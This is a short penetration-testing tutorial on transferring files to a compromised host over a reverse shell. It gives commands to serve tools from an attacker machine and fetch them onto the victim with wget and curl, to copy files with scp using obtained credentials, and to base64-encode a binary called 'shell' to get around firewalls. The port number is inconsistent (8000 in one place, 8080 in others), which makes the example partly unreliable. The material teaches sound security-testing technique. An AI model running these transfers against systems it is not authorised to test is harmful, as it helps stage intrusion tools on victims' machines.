
During any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While metasploit shell allow us to use the Upload command to upload a file, we need to learn methods to transfer files with a standard reverse shell.

### Using wget
There are many ways to accomplish this, one method is via Python HTTP server on our machine and then using wget or cURL to download the file on the remote host. First, we go into the directory that contains the file we need to transger and run a Python HTTP server in it:

```
cd /tmp
python3 -m http.server 8000
```
Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:

```
wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```
Note that we used out IP 10.10.14.1 and the port our Python runs on 8080. If the remote server does not have wget, we can use cURL to download the file:

```
curl http://10.10.14.1:8080/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```
Note that we used -o flag to specify the output file name. 

### Using SCP
Another method to transfer file would be using SCP, granted we have obtained ssh user credentials on the remote host. We can do so as follows:

```
scp linenum.sh user@remotehost:/tmp/linenum.sh

```
Note that we specified the local file name after scp, and the remote directly will be saved to after the :.

### Using Base 64

In some cases, we might not be able to transfer the file. For example, the remote host may ahve firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the string on the remote server and decode it. If we wanted to transfer a binary file called shell, we can base64 encode it as follows:

```
base64 shell -w 0
```

### Validating File Transfers

To validate the format of a file, we can run the file command on it
```
file shell

shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header

```
As we can see, when we run the file command on the shell file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. We can run md5sun on it.

```
md5sum shell
```
Both value should be same on the local and the remote host. 
